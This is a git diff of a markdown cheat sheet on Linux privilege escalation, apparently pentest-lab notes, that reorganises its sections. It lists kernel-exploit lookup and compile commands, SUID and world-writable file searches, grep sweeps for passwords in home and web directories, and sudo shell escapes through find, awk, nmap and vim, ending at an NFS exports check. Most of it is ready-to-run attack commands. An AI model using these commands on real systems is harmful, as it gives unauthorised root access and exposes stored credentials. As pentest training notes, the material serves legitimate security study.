@@ -1,29 +1,19 @@
-# Kernel vulnerability. Don’t have to use exploit suggester exploitdb works just as well. 
+# Kernel vulnerability. (exploit suggester or manual based on version)
 ~~~
 1. Uname -a
 2. linux-exploit-suggester-2.pl -k <KERNEL_VERSION>
 gcc <spoilers> -o exploit -Wl,--hash-style=both
 gcc -m32 -Wl,--hash-style=both
 ~~~
-# Kernel vulnerability. Don’t have to use exploit suggester exploitdb works just as well. 
-This was rare in most instances, in the lab you do get some with vulnerable kernels. 
-The secret is to compile them correct as shown with the gcc commands.
-===============
-find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
-
-# World writable files.
-================
-find / -perm -u=s -type f 2>/dev/null 
-find / -perm -4000 -type f 2>/dev/null 
-
 # Suid misconfiguration. Example programs: nmap vim nano 
+~~~
 Binary with suid permission can be run by anyone, but when they are run they are run as root! 
 Nmap example 
 Nmap: $ nmap --interactive 
 nmap> !sh
-
-https://www.pentestpartners.com/security-blog/exploiting-suid-executables/
-===================
+~~~
+# Search and grep for keywords in all files.
+~~~
 1. cat ~/.bash_history 
 2. cd ~ 
 3. grep -Eir "password|secret|sudo|<username>" * | less 
@@ -34,23 +24,25 @@ https://www.pentestpartners.com/security-blog/exploiting-suid-executables/
 8. cd /var/www 
 9. grep -Eir "password|secret|sudo|<username>" * | less 
 10. find . -type f | xargs grep <SEARCHTERM>
-
-# Search and grep for keywords in all files.
-====================
+~~~
+# Sudo shell escapes.
+~~~~~~
 sudo -l 
 sudo find /bin -name nano -exec /bin/sh \;  
 sudo awk 'BEGIN {system("/bin/sh")}'  
 echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse 
 sudo vim -c '!sh'
-
-# Sudo shell escapes.
-
+~~~
+# test
+~~~
 1. Notice the list of programs that can run via sudo 
 2. Loof for any of these:  
   - find 
   - awk 
   - nmap 
   - vim 
+~~~
+
 If you have any of those proceed to exploit.
 ======================
 1. cat /etc/exports 
